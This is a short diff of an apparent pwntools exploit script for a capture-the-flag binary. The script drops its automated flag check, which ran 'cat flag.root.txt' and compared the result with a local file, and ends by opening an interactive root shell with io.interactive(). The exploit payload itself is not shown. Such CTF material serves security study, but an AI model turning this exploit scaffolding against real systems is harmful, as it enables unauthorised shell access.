@@ -154,7 +154,7 @@ def write_stack_ptr(
 
 
 # -- exploit --
-def exploit() -> bool:
+def exploit():
     io = start()
     io.recvuntil(b"> ")
 
@@ -334,16 +334,7 @@ def exploit() -> bool:
     exit_prog(io)
     
     # enjoy your shell!
-    io.sendline(b"cat flag.root.txt")
-    flag = io.recvuntil(b"\n", drop=True).decode("ascii")
-
-    # comparing to the actual flag
-    with open("./flag.root.txt", "r") as f_in:
-        buf = f_in.readline().strip()
-        if buf in flag:
-            io.success(f"Flag: {flag}")
-            return True
-        return False
+    io.interactive()
 
 
 if __name__ == "__main__":
